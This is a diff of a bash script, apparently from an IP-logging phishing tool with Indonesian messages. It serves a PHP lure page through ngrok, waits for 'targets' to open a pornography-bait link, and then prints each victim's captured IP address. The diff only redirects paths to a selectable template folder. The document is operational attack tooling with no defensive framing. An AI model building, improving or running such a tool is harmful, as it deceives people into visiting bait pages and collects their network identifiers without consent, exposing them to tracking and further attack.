@@ -1,7 +1,7 @@
 #!/bin/bash
 
 hedygans(){
-ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+ip=$(grep -a 'IP:' server/$sever/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 
@@ -24,7 +24,7 @@ printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Menuggu targets,\e[0m\e[1;77m teka
 while [ true ]; do
 
 
-if [[ -e "ip.txt" ]]; then
+if [[ -e "server/$sever/ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Target open Bokep!\n"
 hedygans
 rm -rf ip.txt
@@ -41,7 +41,7 @@ done
 
 ngrok(){
 printf "\e[1;92m[\e[0m+\e[1;92m]\033[1;38;5;208mStart php server su\033[31;1m(\033[37;1mHostpotnya Hidupin su!!\033[31;1m)\e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...!!!\e[0m\n"
-php -t "server/" -S 0.0.0.0:3333 > /dev/null 2>&1 &
+cd server/$sever && php -S 0.0.0.0:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m]\033[1;38;5;208mStart ngrok server su\033[31;1m(\033[37;1mHotspot idupin\033[31;1m)\e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...!!!\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
